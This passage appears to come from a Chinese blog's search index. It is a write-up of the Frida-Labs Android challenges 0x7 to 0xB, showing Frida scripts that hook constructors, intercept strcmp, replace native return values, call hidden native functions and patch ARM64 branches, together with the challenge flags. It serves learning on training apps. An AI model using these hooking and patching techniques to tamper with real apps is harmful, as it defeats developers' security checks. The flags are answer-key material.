onCreate(Bundle savedInstanceState) &#123;        Checker ch = new Checker(123, 321);        try &#123;            flag(ch);        &#125;     &#125;    public void flag(Checker A) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;        if (A.num1 &gt; 512 &amp;&amp; 512 &lt; A.num2) &#123;                       this.f103t1.setText(decrypted);        &#125;    &#125;&#125;\nchecker\npackage com.ad2001.frida0x7;public class Checker &#123;    int num1;    int num2;    Checker(int a, int b) &#123;        this.num1 = a;        this.num2 = b;    &#125;&#125;\n\n模板\nJava.perform(function() &#123;  var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);  &lt;class_reference&gt;.$init.implementation = function(&lt;args&gt;)&#123;    /*    */  &#125;&#125;);\n\n$init: 在 Frida 中，$init 是一个特殊的名称，用来代表 Java 类的构造函数。Java 中的构造函数名称与类名相同，但 Frida 为了提供统一的 Hook 机制，使用了 $init 这个标识符。\n实际操作\nJava.perform(function() &#123;  var a =  Java.use(&quot;com.ad2001.frida0x7.Checker&quot;);  a.$init.implementation = function(param)&#123;    this.$init(600, 600);  &#125;&#125;);\n注意时机在 onCreate 方法中创建 Checker 类的实例，原始的 onCreate 方法会 立即 创建 Checker 对象 (new Checker(123, 321);)。在之后 尝试设置的 Checker 构造函数 Hook 根本不会被触发，因为 Checker 对象已经创建完毕了。所以要尽可能地早要hook到oncreate，那么就要使用更快的附加方式：Spawnfrida -U -f 包名 -l 脚本名称 \nfrida -U -f com.ad2001.frida0x7 -l test.js\n\n\n\n\n其他思路不修改原始流程，额外调用。手动创建一个新的 Checker 对象，直接给符合要求的值，主动调用找到的 MainActivity 实例的 flag 方法，传入新创建的对象\nJava.performNow(function () &#123;    Java.choose(&quot;com.ad2001.frida0x7.MainActivity&quot;, &#123;        onMatch: function (instance) &#123;            var Checker = Java.use(&quot;com.ad2001.frida0x7.Checker&quot;);            var Checker_obj = Checker.$new(513, 513);            instance.flag(Checker_obj);        &#125;,        onComplete: function () &#123; &#125;    &#125;);&#125;);\n用这种方法普通地附加上去就可以了\nfrida -U &quot;Frida 0x7&quot; -l test.js\n\n0x8 静态sojava\npackage com.ad2001.frida0x8;public class MainActivity extends AppCompatActivity &#123;    public native int cmpstr(String str);    static &#123;        System.loadLibrary(&quot;frida0x8&quot;);    &#125;    protected void onCreate(Bundle savedInstanceState) &#123;            public void onClick(View v) &#123;                int res = MainActivity.this.cmpstr(ip);                if (res == 1) &#123;                                &#125;            &#125;        &#125;);    &#125;&#125;\n将程序解包得到so文件java -jar apktool.jar d frida0x8.apk -o ./frida0x8so\nbool __fastcall Java_com_ad2001_frida0x8_MainActivity_cmpstr(__int64 a1, __int64 a2, __int64 a3)&#123;  int v4; // [xsp+20h] [xbp-C0h]  int i; // [xsp+24h] [xbp-BCh]  char *s1; // [xsp+30h] [xbp-B0h]  char s2[100]; // [xsp+74h] [xbp-6Ch] BYREF  __int64 v10; // [xsp+D8h] [xbp-8h]  v10 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);  s1 = (char *)_JNIEnv::GetStringUTFChars(a1, a3, 0LL);  for ( i = 0; i &lt; __strlen_chk(&quot;GSJEB|OBUJWF`MBOE~&quot;, 0xFFFFFFFFFFFFFFFFLL); ++i )    s2[i] = aGsjebObujwfMbo[i] - 1;  s2[__strlen_chk(&quot;GSJEB|OBUJWF`MBOE~&quot;, 0xFFFFFFFFFFFFFFFFLL)] = 0;  v4 = strcmp(s1, s2);  __android_log_print(3, &quot;input &quot;, &quot;%s&quot;, s1);  __android_log_print(3, &quot;Password&quot;, &quot;%s&quot;, s2);  _JNIEnv::ReleaseStringUTFChars(a1, a3, s1);  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));  return v4 == 0;&#125;\n它在这里恒返回0，而在java中它需要等于1现在我们想修改Java_com_ad2001_frida0x8_MainActivity_cmpstr()函数，那么首先我们要找到它在哪\n这里是几种找到函数地址的方法Module.enumerateExports（）此 API 枚举来自指定模块的所有导出 （符号） 。导出的函数由 Java 空间中的应用程序使用。它需要一个参数，该参数是要枚举其导出的模块 （共享库或可执行文件） 的名称现在，让我们尝试获取 cmpstr 函数的地址。\n[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateExports(&quot;libfrida0x8.so&quot;)[0]&#123;    &quot;address&quot;: &quot;0x782945e864&quot;,    &quot;name&quot;: &quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;,    &quot;type&quot;: &quot;function&quot;&#125;[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateExports(&quot;libfrida0x8.so&quot;)[0][&quot;address&quot;]&quot;0x782945e864&quot;\n\nModule.getExportByName(modulename, exportName) 函数从模块 （shared library） 中检索具有给定名称的导出元件的地址\n[Pixel 4::Frida 0x8 ]-&gt; Module.getExportByName(&quot;libfrida0x8.so&quot;,&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;)&quot;0x782945e864&quot;\n\nModule.findExportByName（）与 Module.getExportByName（） 相同。唯一的区别是，如果未找到导出， 则 Module.getExportByName（） 会引发异常，而  Module.findExportByName（） 将返回 null。\nModule.getBaseAddress（） 返回给定模块的基址。\n[Pixel 4::Frida 0x8 ]-&gt; Module.getBaseAddress(&quot;libfrida0x8.so&quot;)&quot;0x782945e000&quot;\n有了基址后就只需要找到函数的偏移量，这个偏移量可以在ida里直接看到,比如cmpstr的偏移就是0x864相加就是0x782945e864\n.text:0000000000000864.text:0000000000000864 ; =============== S U B R O U T I N E =======================================.text:0000000000000864.text:0000000000000864 ; Attributes: bp-based frame.text:0000000000000864.text:0000000000000864 ; bool __fastcall Java_com_ad2001_frida0x8_MainActivity_cmpstr(__int64, __int64, __int64).text:0000000000000864                 EXPORT Java_com_ad2001_frida0x8_MainActivity_cmpstr.text:0000000000000864 Java_com_ad2001_frida0x8_MainActivity_cmpstr.text:0000000000000864                                         ; DATA XREF: LOAD:0000000000000380↑o\n\nModule.enumerateImports（）与 Module.enumerateExports（） 类似, 它将为我们提供所有模块的导入\n[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateImports(&quot;libfrida0x8.so&quot;)[    &#123;        &quot;address&quot;: &quot;0x7914724d84&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;__cxa_finalize&quot;,        &quot;slot&quot;: &quot;0x782945fcd0&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x7914724c08&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;__cxa_atexit&quot;,        &quot;slot&quot;: &quot;0x782945fcd8&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x7914720b0c&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;__register_atfork&quot;,        &quot;slot&quot;: &quot;0x782945fce0&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x79146e8cc0&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;__strlen_chk&quot;,        &quot;slot&quot;: &quot;0x782945fcf0&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x79146bf740&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;strcmp&quot;,        &quot;slot&quot;: &quot;0x782945fcf8&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x791456f714&quot;,        &quot;module&quot;: &quot;/system/lib64/liblog.so&quot;,        &quot;name&quot;: &quot;__android_log_print&quot;,        &quot;slot&quot;: &quot;0x782945fd00&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;,    &#123;        &quot;address&quot;: &quot;0x791470d4d4&quot;,        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,        &quot;name&quot;: &quot;__stack_chk_fail&quot;,        &quot;slot&quot;: &quot;0x782945fd10&quot;,        &quot;type&quot;: &quot;function&quot;    &#125;][Pixel 4::Frida 0x8 ]-&gt; Module.enumerateImports(&quot;libfrida0x8.so&quot;)[4][&#x27;address&#x27;]&quot;0x79146bf740&quot;\n\n获取函数地址的方法知道了，现在可以开始利用函数了在这里提供一个模板\nInterceptor.attach(targetAddress, &#123;    onEnter: function (args) &#123;        console.log(&#x27;Entering &#x27; + functionName);        // Modify or log arguments if needed    &#125;,    onLeave: function (retval) &#123;        console.log(&#x27;Leaving &#x27; + functionName);        // Modify or log return value if needed    &#125;&#125;);\n\n\n\n刚开始我的尝试是直接将它的返回值改成1\nJava.perform(function () &#123;    var targetSo = &quot;libfrida0x8.so&quot;;     var funcName = &quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;;    var fridaretAddr = Module.findExportByName(targetSo, funcName);        console.log(fridaretAddr);    if (fridaretAddr != null) &#123;        Interceptor.attach(fridaretAddr, &#123;            onEnter: function (args) &#123;            &#125;,            onLeave: function (retval) &#123;                retval.replace(1);                console.log(&quot;retval&quot;, retval.toInt32());            &#125;        &#125;)    &#125;&#125;);\n但是什么也没有发生，它只是将我的返回值改成了我的输入值，我想那不是flag这是它的日志\nflame:/ # logcat | grep &quot;11156&quot;04-17 09:29:09.618 11156 11189 I Adreno  : PFP: 0x016ee185, ME: 0x0000000004-17 09:31:57.953 11156 11156 I AssistStructure: Flattened final assist data: 1372 bytes, containing 1 windows, 8 views04-17 09:32:10.740 11156 11156 D input   : AAA04-17 09:32:10.740 11156 11156 D Password: FRIDA&#123;NATIVE_LAND&#125;\n其实在日志里就解密好了s2就是目标字符串，它是加密字符串，但是在和输入进行比较时会进行解密，这里也在日志里打印了解密结果\nfor ( i = 0; i &lt; __strlen_chk(&quot;GSJEB|OBUJWF`MBOE~&quot;, 0xFFFFFFFFFFFFFFFFLL); ++i )    s2[i] = aGsjebObujwfMbo[i] - 1;  s2[__strlen_chk(&quot;GSJEB|OBUJWF`MBOE~&quot;, 0xFFFFFFFFFFFFFFFFLL)] = 0;  v4 = strcmp(s1, s2);  __android_log_print(3, &quot;input &quot;, &quot;%s&quot;, s1);  __android_log_print(3, &quot;Password&quot;, &quot;%s&quot;, s2);\n到这里就解出题目了\n换个思路我们要使res&#x3D;1，那么就要输入和它想要对比的字符一样的字符串，那么和我们进行对比的字符串是什么呢？我们能获取到strcmp函数的第二个参数，也就是和我们输入进行对比的字符吗？\n先查找strcmp都在什么地方出现\nvar strcmp_adr = Module.findExportByName(&quot;libfrida0x8.so&quot;, &quot;strcmp&quot;);Interceptor.attach(strcmp_adr, &#123;    onEnter: function (args) &#123;        console.log(&quot;Hooking the strcmp function&quot;);    &#125;,    onLeave: function (retval) &#123;    &#125;&#125;);\n出来了很多结果那么怎么定位我们的目标strcmp函数（和我们的输入相关联的strcmp)可以肯定目标strcmp和其他strcmp不同的地方就在于传入的参数不同那么现在来查找函数的参数\n函数声明如下\nint strcmp( const char *string1, const char *string2 );\n使用 Memory.readUtf8String（） API。它使用提供的地址从内存中读取 utf 字符串。args 是一个指针数组，其中包含 strcmp 函数的参数。因此，要访问第一个参数，我们可以使用 arg[0]。\nvar strcmp_adr = Module.findExportByName(&quot;libc.so&quot;, &quot;strcmp&quot;);Interceptor.attach(strcmp_adr, &#123;    onEnter: function (args) &#123;        //console.log(&quot;try find args&quot;);        var arg0 = Memory.readUtf8String(args[0]);        console.log(arg0);    &#125;,    onLeave: function (retval) &#123;    &#125;&#125;);\n这是其中一部分数据，看来调用strcmp的方法很多\n[Pixel 4::Frida 0x8 ]-&gt; Ljava/lang/String;Lcom/android/internal/telephony/ProxyController;Lcom/android/internal/view/IInputMethodClient$Stub;Lcom/android/internal/telephony/PhoneSubInfoController;Landroid/view/View;Landroid/view/autofill/AutofillManager$AutofillClient;Landroid/net/Uri$HierarchicalUri;Landroid/os/UserHandle;Ljava/lang/Object;Lcom/android/internal/telephony/euicc/EuiccConnector$AvailableState;Lcom/android/i18n/phonenumbers/Phonemetadata$NumberFormat;Landroid/content/IContentProvider;Landroid/os/Bundle;Ljava/lang/String;Ljava/lang/String;\n第一个参数是我们输入的参数，那么现在进行过滤现在输入hello，来确认目标地址\nvar strcmp_adr = Module.findExportByName(&quot;libc.so&quot;, &quot;strcmp&quot;);Interceptor.attach(strcmp_adr, &#123;    onEnter: function (args) &#123;        var arg0 = Memory.readUtf8String(args[0]);        if (arg0.includes(&quot;hello&quot;)) &#123;            console.log(arg0);            //console.log(strcmp_adr);            //获取指定strcmp地址        &#125;    &#125;,    onLeave: function (retval) &#123;    &#125;&#125;);\n现在得到的数据就只有一条\n[Pixel 4::Frida 0x8 ]-&gt; hello\n然后按照之前的方法获取第二个参数Memory.readUtf8String(args[1]);\nvar strcmp_adr = Module.findExportByName(&quot;libc.so&quot;, &quot;strcmp&quot;);Interceptor.attach(strcmp_adr, &#123;    onEnter: function (args) &#123;        var arg0 = Memory.readUtf8String(args[0]);        var arg1 = Memory.readUtf8String(args[1]);        if (arg0.includes(&quot;hello&quot;)) &#123;            console.log(arg0);            //console.log(strcmp_adr);            console.log(arg1);        &#125;    &#125;,    onLeave: function (retval) &#123;    &#125;&#125;);\n得到flag\n[Pixel 4::Frida 0x8 ]-&gt; helloFRIDA&#123;NATIVE_LAND&#125;\n\n\n0x9 修改静态so返回值主要逻辑\npackage com.ad2001.a0x9;public class MainActivity extends AppCompatActivity &#123;    public native int check_flag();    static &#123;        System.loadLibrary(&quot;a0x9&quot;);    &#125;      protected void onCreate(Bundle savedInstanceState) &#123;    stener(new View.OnClickListener() &#123;             \tpublic void onClick(View v) &#123;                if (MainActivity.this.check_flag() == 1337) &#123;                                &#125;        &#125;);    &#125;&#125;\nso\n__int64 Java_com_ad2001_a0x9_MainActivity_check_1flag()&#123;  return 1LL;&#125;\n\n简单的修改返回值\nvar flag_adr = Module.findExportByName(&quot;liba0x9.so&quot;, &quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;);Interceptor.attach(flag_adr, &#123;    onEnter: function (args) &#123;        console.log(&quot;catch the flag&quot;);    &#125;,    onLeave: function (retval) &#123;        //retval = 1337;//错误的赋值        retval.replace(1337);        console.log(&quot;change the result&quot;);    &#125;&#125;);\n\n模板\nInterceptor.attach(targetAddress, &#123;    onEnter: function (args) &#123;        console.log(&#x27;Entering &#x27; + functionName);        // 修改参数    &#125;,    onLeave: function (retval) &#123;        console.log(&#x27;Leaving &#x27; + functionName);        // 修改返回值    &#125;&#125;);\n\n这里的函数名不是check_flag而是check_1flag,这和jni的命名规则有关，特殊转义，下划线 _** → _1\n0xA 动态sojava\npackage com.ad2001.frida0xa;public final class MainActivity extends AppCompatActivity &#123;    public final native String stringFromJNI();        protected void onCreate(Bundle savedInstanceState) &#123;                activityMainBinding.sampleText.setText(stringFromJNI());    &#125;    static &#123;        System.loadLibrary(&quot;frida0xa&quot;);    &#125;&#125;\nso\n__int64 __fastcall Java_com_ad2001_frida0xa_MainActivity_stringFromJNI(_JNIEnv *a1)&#123;  const char *v1; // x0  __int64 v3; // [xsp+18h] [xbp-48h]  _BYTE v5[24]; // [xsp+40h] [xbp-20h] BYREF  __int64 v6; // [xsp+58h] [xbp-8h]  v6 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);  std::string::basic_string&lt;decltype(nullptr)&gt;();  v1 = (const char *)sub_1DD3C(v5);  v3 = _JNIEnv::NewStringUTF(a1, v1);  std::string::~string(v5);  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));  return v3;&#125;\n前面这两个主要是把文本 “Hello Hackers”显示在我们的 TextView 中。继续找然后在so这里找到了get_flag()\n__int64 __fastcall get_flag(__int64 result, int a2)&#123;  int i; // [xsp+Ch] [xbp-44h]  char v3[20]; // [xsp+34h] [xbp-1Ch] BYREF  __int64 v4; // [xsp+48h] [xbp-8h]  v4 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);  if ( (_DWORD)result + a2 == 3 )  &#123;    for ( i = 0; i &lt; __strlen_chk(&quot;FPE&gt;9q8A&gt;BK-)20A-#Y&quot;, 0xFFFFFFFFFFFFFFFFLL); ++i )      v3[i] = aFpe9q8aBk20aY[i] + 2 * i;    v3[19] = 0;    result = __android_log_print(3, &quot;FLAG&quot;, &quot;Decrypted Flag: %s&quot;, v3);  &#125;  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));  return result;&#125;\n它会把最终的flag打印result = __android_log_print(3, &quot;FLAG&quot;, &quot;Decrypted Flag: %s&quot;, v3);在日志里\n接下来分析get_flag(),两个参数相加等于3\nget_flag(__int64 result, int a2)if ( (_DWORD)result + a2 == 3 )\n\n接下来就是怎么hook动态注册的函数，并且修改函数的参数值\nget_flag()这个名字看起来就是动态注册的，静态注册的命名很特别：Java_&#123;PackageName&#125;_&#123;ClassName&#125;_&#123;MethodName&#125;\n尝试导出函数，它也不在可导出列表\n[Pixel 4::Frida 0xA ]-&gt; Module.findExportByName(&quot;libfrida0xa.so&quot;, &quot;Java_com_ad2001_frida0xa_MainActivity_stringF romJNI&quot;)&quot;0x72e0b0fbe0&quot;[Pixel 4::Frida 0xA ]-&gt; Module.findExportByName(&quot;libfrida0xa.so&quot;, &quot;get_flag&quot;)null\n\n使用0x8控制静态方法的模板不可行\n这里给个新的模板\nvar native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);const native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);native_function(&lt;arguments&gt;);\n\nvar native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);\n要在 frida 中调用native函数，我们需要一个 NativePointer 对象。我们应该将要调用的原生函数的地址传递给 NativePointer 构造函数。接下来，我们将创建 NativeFunction 对象 ，它表示我们想要调用的实际原生函数。它围绕原生函数创建了一个 JavaScript 包装器，允许我们从 frida 调用该原生函数\nconst native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);\n第一个参数应该是 NativePointer 对象，第二个参数是原生函数的返回类型，第三个参数是要传递给原生函数的参数的数据类型列表。\nnative_function(&lt;arguments&gt;);\n接着就可以调用定义好的方法了\n那么如何查找动态注册的native的地址呢？打开ida查看它的偏移,可以得到偏移为0x1DD60\n.text:000000000001DD5C                 RET.text:000000000001DD5C ; &#125; // starts at 1DD3C.text:000000000001DD5C ; End of function sub_1DD3C.text:000000000001DD5C.text:000000000001DD60.text:000000000001DD60 ; =============== S U B R O U T I N E =======================================.text:000000000001DD60.text:000000000001DD60 ; Attributes: bp-based frame.text:000000000001DD60.text:000000000001DD60 ; __int64 __fastcall get_flag(__int64 result, int).text:000000000001DD60                 EXPORT _Z8get_flagii.text:000000000001DD60 _Z8get_flagii                           ; DATA XREF: LOAD:0000000000001648↑o\n所在库就是基址找到libfrida0xa.so的基址var base = Module.findBaseAddress(&quot;libfrida0xa.so&quot;);然后加上偏移var flag_adr = base.add(0x1DD60);就得到了目标地址\n具体操作\nvar base = Module.findBaseAddress(&quot;libfrida0xa.so&quot;);var flag_adr = base.add(0x1DD60);var native_adr = new NativePointer(flag_adr);  //创建NativePointer//创建NativeFunctionconst get_flag = new NativeFunction(native_adr, &#x27;void&#x27;, [&#x27;int&#x27;, &#x27;int&#x27;]);//调用get_flag(1, 2);\n\n在日志里看到flag\n :&gt;frida-ps -Uai  PID  Name                 Identifier-----  -------------------  ---------------------------------------19645  frida 0xA            com.ad2001.frida0xaflame:/ # logcat | grep &quot;19645&quot;04-17 10:12:22.425 19645 19692 D ProfileInstaller: Installing profile for com.ad2001.frida0xa04-17 10:23:42.752 19645 19691 D FLAG    : Decrypted Flag: FRIDA&#123;DONT_CALL_ME&#125;04-17 10:23:43.537 19645 19691 D FLAG    : Decrypted Flag: FRIDA&#123;DONT_CALL_ME&#125;\n\n0xB 加花的so主要逻辑\npackage com.ad2001.frida0xb;public final class MainActivity extends AppCompatActivity &#123;        public final native void getFlag();    protected void onCreate(Bundle savedInstanceState) &#123;        btn.setOnClickListener(new View.OnClickListener() &#123;             public final void onClick(View view) &#123;                MainActivity.onCreate$lambda$0(MainActivity.this, view);            &#125;        &#125;);    &#125;       public static final void onCreate$lambda$0(MainActivity this$0, View it) &#123;        Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;);        this$0.getFlag();    &#125;    static &#123;        System.loadLibrary(&quot;frida0xb&quot;);    &#125;&#125;\nso\nvoid Java_com_ad2001_frida0xb_MainActivity_getFlag()&#123;  ;&#125;\n这次的so反编译结果什么也没有那么尝试手动分析其逻辑\n.text:0000000000015220.text:0000000000015220 ; __unwind &#123;.text:0000000000015220                 SUB             SP, SP, #0x60.text:0000000000015224                 STP             X29, X30, [SP,#0x50+var_s0].text:0000000000015228                 ADD             X29, SP, #0x50.text:000000000001522C                 STUR            X0, [X29,#var_18].text:0000000000015230                 STUR            X1, [X29,#var_20].text:0000000000015234                 MOV             W8, #0xDEADBEEF.text:000000000001523C                 STUR            W8, [X29,#var_24].text:0000000000015240                 LDUR            W8, [X29,#var_24].text:0000000000015244                 SUBS            W8, W8, #0x539.text:0000000000015248                 B.NE            loc_1532C.text:000000000001524C                 B               loc_15250.text:0000000000015250 ; ---------------------------------------------------------------------------.text:0000000000015250.text:0000000000015250 loc_15250                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+2C↑j.text:0000000000015250                 STR             XZR, [SP,#0x50+var_30].text:0000000000015254                 ADRL            X8, aJEhmwbmxezisdm ; &quot;j~ehmWbmxezisdmogi~Q&quot;.text:000000000001525C                 STR             X8, [SP,#0x50+var_38].text:0000000000015260                 LDR             X8, [SP,#0x50+var_38].text:0000000000015264                 STUR            X8, [X29,#var_8].text:0000000000015268                 MOV             X8, #0xFFFFFFFFFFFFFFFF.text:000000000001526C                 STUR            X8, [X29,#var_10].text:0000000000015270                 LDUR            X0, [X29,#var_8] ; char *.text:0000000000015274                 LDUR            X1, [X29,#var_10] ; size_t.text:0000000000015278                 BL              .__strlen_chk.text:000000000001527C                 STR             X0, [SP,#0x50+var_40].text:0000000000015280                 LDR             X8, [SP,#0x50+var_40].text:0000000000015284                 ADD             X0, X8, #1 ; unsigned __int64.text:0000000000015288                 BL              ._Znam  ; operator new[](ulong).text:000000000001528C                 STR             X0, [SP,#0x50+var_48].text:0000000000015290                 STR             XZR, [SP,#0x50+var_30].text:0000000000015294                 B               loc_15298\n这是一个关键跳转\n.text:0000000000015248                 B.NE            loc_1532C.text:000000000001524C                 B               loc_15250\nloc_1532c会直接跳到末尾结束函数\n.text:000000000001532C ; ---------------------------------------------------------------------------.text:000000000001532C.text:000000000001532C loc_1532C                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+28↑j.text:000000000001532C                                         ; Java_com_ad2001_frida0xb_MainActivity_getFlag:loc_15328↑j.text:000000000001532C                 LDP             X29, X30, [SP,#0x50+var_s0].text:0000000000015330                 ADD             SP, SP, #0x60 ; &#x27;`&#x27;.text:0000000000015334                 RET.text:0000000000015334 ; &#125; // starts at 15220.text:0000000000015334 ; End of function Java_com_ad2001_frida0xb_MainActivity_getFlag.text:0000000000015334\n而loc_15250会执行一段解密逻辑并正常走完函数\n.text:0000000000015250 loc_15250                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+2C↑j.text:0000000000015250                 STR             XZR, [SP,#0x50+var_30].text:0000000000015254                 ADRL            X8, aJEhmwbmxezisdm ; &quot;j~ehmWbmxezisdmogi~Q&quot;.text:000000000001525C                 STR             X8, [SP,#0x50+var_38].text:0000000000015260                 LDR             X8, [SP,#0x50+var_38].text:0000000000015264                 STUR            X8, [X29,#var_8].text:0000000000015268                 MOV             X8, #0xFFFFFFFFFFFFFFFF.text:000000000001526C                 STUR            X8, [X29,#var_10].text:0000000000015270                 LDUR            X0, [X29,#var_8] ; char *.text:0000000000015274                 LDUR            X1, [X29,#var_10] ; size_t.text:0000000000015278                 BL              .__strlen_chk.text:000000000001527C                 STR             X0, [SP,#0x50+var_40].text:0000000000015280                 LDR             X8, [SP,#0x50+var_40].text:0000000000015284                 ADD             X0, X8, #1 ; unsigned __int64.text:0000000000015288                 BL              ._Znam  ; operator new[](ulong).text:000000000001528C                 STR             X0, [SP,#0x50+var_48].text:0000000000015290                 STR             XZR, [SP,#0x50+var_30].text:0000000000015294                 B               loc_15298.text:0000000000015298 ; ---------------------------------------------------------------------------\n\n那么现在的解题思路就是：1.nop掉.text:0000000000015248                 B.NE            loc_1532C2.将它替换成.text:000000000001524C                 B               loc_15250\nB.NE代表Branch if Not Equal，也就是当两个操作数不相等时才会跳转B代表跳转\n修改内存:https://learnfrida.info/advanced_usage/#patching-memorypatchcodeMemory.patchCode API 允许我们修改 X 地址处的 N 个字节，该地址以 NativePointer 的形式给出，此指针必须是可写的，以便我们对其进行修改。在某些系统（如 iOS）中，地址指针在映射到内存之前会写入临时位置。因此，代码编写者的第一个参数应该是 code 参数，而不是 openPtr）。\nMemory.patchCode(openPtr, Process.pageSize, function (code) &#123;\tconst cw = new X86Writer(code, &#123; pc: openPtr &#125;);\tcw.putNopPadding(Process.pageSize);\tcw.putRet();\tcw.flush();&#125;);\n这里是X86Writer,不同的架构要使用不同的方法，我的手机是Arm架构，在这里我用的是Arm64Writer可以查看api:https://frida.re/docs/javascript-api/#x86writer\n实际操作如下按照之前的方法找到loc_1532C地址，然后进行patch\nvar libbase = Module.findBaseAddress(&quot;libfrida0xb.so&quot;);var jmp = libbase.add(0x15248);Memory.patchCode(jmp, 4, function (code) &#123;\tconst cw = new Arm64Writer(code, &#123; pc: jmp &#125;);\tcw.putNop(); //进行nop替换\tcw.flush();&#125;);\n\n\n\n另一个模板\nvar writer = new X86Writer(&lt;address_of_the_instruction&gt;);try &#123;  // Insert instructions  // Flush the changes to memory  writer.flush();&#125; finally &#123;  // Dispose of the X86Writer to free up resources  writer.dispose();&#125;\n关于flush():调用 flush 方法将更改应用于内存。这可确保将修改后的指令写入内存位置。\nfinally 块用于确保 X86Writer 资源得到正确清理。调用 dispose 方法释放 X86Writer 实例关联的资源。此模板是x86,因此如果我要用在我自己的手机上我需要对其进行更改\n现在来看方法二，替换指令\n\nputBImm(target): put a B instruction2.将它替换成.text:000000000001524C                 B               loc_15250var libbase = Module.findBaseAddress(&quot;libfrida0xb.so&quot;);var jmp = libbase.add(0x15248);var target = libbase.add(0x1524c);Memory.patchCode(jmp, 4, function (code) &#123;\tconst cw = new Arm64Writer(code, &#123; pc: jmp &#125;);\t//cw.putNop();\tcw.putBImm(target);\tcw.flush();&#125;);\n\n另一种写法\nvar adr = Module.findBaseAddress(&quot;libfrida0xb.so&quot;).add(0x15248);  // Addres of the b.ne instructionMemory.protect(adr, 0x1000, &quot;rwx&quot;);var writer = new Arm64Writer(adr);  // ARM64 writer objectvar target = Module.findBaseAddress(&quot;libfrida0xb.so&quot;).add(0x1524c);  // Address of the next instruction  b  LAB_00115250try &#123;  writer.putBImm(target);   // Inserts the &lt;b target&gt; instruction in the place of b.ne instruction  writer.flush();  console.log(`Branch instruction inserted at $&#123;adr&#125;`);&#125; finally &#123;  writer.dispose();&#125;\n\n\n修改内存权限“此指针必须是可写的”所以如果该页权限受限就可能无法正常patch,这个时候就需要进行权限修改Memory.protect 函数的语法为：\nMemory.protect(address, size, protection);\naddress：用于更改保护的内存区域的起始地址。size：内存区域的大小（以字节为单位）。protection：内存区域的保护属性。\n通常需要指定一个页的大小\nMemory.protect(jnz, 0x1000, &quot;rwx&quot;);\n这句单独写在外面，这个是x86的利用脚本\nvar jnz = Module.getBaseAddress(&quot;libfrida0xb.so&quot;).add(0x20e2a - 0x00010000);Memory.protect(jnz, 0x1000, &quot;rwx&quot;);var writer = new X86Writer(jnz);try &#123;  writer.putNop()  writer.putNop()  writer.putNop()  writer.putNop()  writer.putNop()  writer.putNop()  writer.flush();&#125; finally &#123;  writer.dispose();&#125;\n\n字节对齐ARM64的nop是4字节，x86的nop是一字节\n\nARM64 (A64 指令集):\n\n架构类型: RISC (精简指令集计算) 风格。虽然现代 ARM 很复杂，但 A64 保留了 RISC 的一些关键特性。\n指令长度: **固定长度 (Fixed-Length)**。所有 A64 指令都是 4 字节 (32位) 长。\n对齐要求: 指令必须存储在 4 字节对齐的地址上。CPU 总是从 4 字节对齐的地址开始，一次读取 4 个字节作为一条指令进行解码。\n\n\nx86 &#x2F; x86-64:\n\n架构类型: CISC (复杂指令集计算) 风格。\n指令长度: **可变长度 (Variable-Length)**。x86 指令的长度可以从 1 字节到 15 字节不等。指令的第一个字节（或几个字节）通常包含操作码 (Opcode)，后续字节可能包含操作数、寻址模式信息或前缀等。\n对齐要求: 指令可以从任何字节地址开始。虽然处理器为了性能也喜欢对齐的指令（特别是跳转目标），但硬件设计必须能够处理从任意字节边界开始的指令。\n\n\n\n参考资料https://github.com/DERE-ad2001/Frida-Labs/https://learnfrida.info/advanced_usage/https://codeshare.frida.re/\n"},{"title":"Linux沙箱之seccomp介绍","url":"/2024/09/21/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp%E4%BB%8B%E7%BB%8D/","content":"介绍seccomp (Secure Computing Mode) 是 Linux 